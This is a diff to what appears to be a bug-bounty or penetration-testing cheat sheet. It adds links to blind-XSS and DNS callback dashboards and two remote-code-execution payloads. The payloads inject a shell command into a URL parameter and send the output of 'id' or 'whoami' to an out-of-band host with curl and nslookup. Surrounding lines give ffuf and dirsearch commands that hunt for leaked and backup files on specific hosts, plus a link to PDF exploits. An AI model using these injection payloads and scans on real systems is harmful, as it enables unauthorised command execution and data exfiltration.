@@ -45,8 +45,11 @@ PDF-prompt:
 https://raw.githubusercontent.com/coffinxp/pdFExploits/refs/heads/main/cookieprompt.pdf
 
 CanaryTokens: https://canarytokens.org/nest/
-
+Blind XSS: https://xss.report/dashboard  ,  https://xss0r.com/dashboard#payloads
+DNS: https://app.interactsh.com/#/
 --------------------------------------------------------------------------------------------------------------------------
+RCE:  https://subdomain.domain.tld/emdpoint?param=value;curl https://leejddzqxtsqqoufangeztlfxozoqwtf2.oast.fun -X POST -d `id`
+RCE:  https://subdomain.domain.tld/emdpoint?param=value;nslookup `whoami`.leejddzqxtsqqoufangeztlfxozoqwtf2.oast.fun
 
 FUZZ:   ffuf -w ~/wordlists/Bug-Bounty-Wordlists/all-files-leaked.txt -u https://nxdev.bbbbbbbt.edu.bdFUZZ
 Dirsearch:  dirsearch -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json  -u https://adminblog.abc.com/
